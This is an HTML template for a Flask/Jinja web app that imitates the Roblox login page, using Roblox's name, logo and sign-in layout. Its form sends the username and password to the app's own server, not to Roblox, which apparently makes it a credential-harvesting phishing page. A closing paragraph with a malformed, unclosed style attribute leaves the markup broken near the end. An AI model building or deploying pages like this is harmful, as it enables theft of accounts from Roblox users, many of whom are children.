<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login - Roblox</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='style1.css') }}">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="{{ url_for('static', filename='roblox.png') }}" type="image/png">
</head>
<body class="login-page">
  <div class="login-container">
    <img src="{{ url_for('static', filename='roblox.png') }}" alt="Roblox Logo" class="roblox-logo">

    <div class="login-box">
      <h2 class="login-header">Login to Roblox</h2>

      {% if error %}
        <p class="error">{{ error }}</p>
      {% endif %}

      <form method="POST">
        <input type="text" name="username" placeholder="Username/Email/Phone" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
      </form>

      <p class="forgot">Forgot Password or Username?</p>

      <div class="divider">or</div>

      <button class="device-btn">Another Logged In Device</button>

      <p class="signup-text">Don't have an account? <a href="#">Sign Up</a></p>
    </div>
     <p style="font-size: 10px;
              color: gray;
              max-width: 500px;
              width: 445px;

</p>
  </div>
  
</body>
</html>
